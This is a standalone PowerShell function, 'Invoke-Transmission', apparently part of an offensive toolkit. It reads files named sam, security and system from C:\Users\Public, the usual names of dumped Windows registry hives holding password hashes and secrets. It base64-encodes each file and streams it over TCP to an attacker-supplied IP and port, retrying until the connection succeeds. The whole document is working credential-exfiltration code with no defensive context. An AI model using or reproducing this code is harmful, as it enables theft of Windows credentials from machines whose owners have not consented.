function Invoke-Transmission {
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ip,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [int]
        $port = 9000
    )
    $Message1 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\sam'))
    $Message2 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\security'))
    $Message3 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\system'))
    do{
        try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
        catch { Sleep 1;Write-Host Connecting... }
    } while (-not $client.Connected)
    $stream = $client.GetStream()
    $data = [text.Encoding]::Ascii.GetBytes($Message1)
    $stream.Write($data,0,$data.length)
    $client.Close()
    $client.Dispose()
    do{
        try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
        catch { Sleep 1 }
    } while (-not $client.Connected)
    $stream = $client.GetStream()
    $data = [text.Encoding]::Ascii.GetBytes($Message2)
    $stream.Write($data,0,$data.length)
    $client.Close()
    $client.Dispose()
    do{
        try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
        catch { Sleep 1 }
    } while (-not $client.Connected)
    $stream = $client.GetStream()
    $data = [text.Encoding]::Ascii.GetBytes($Message3)
    $stream.Write($data,0,$data.length)
    Write-Host Finished
    $client.Close()
    $client.Dispose()
}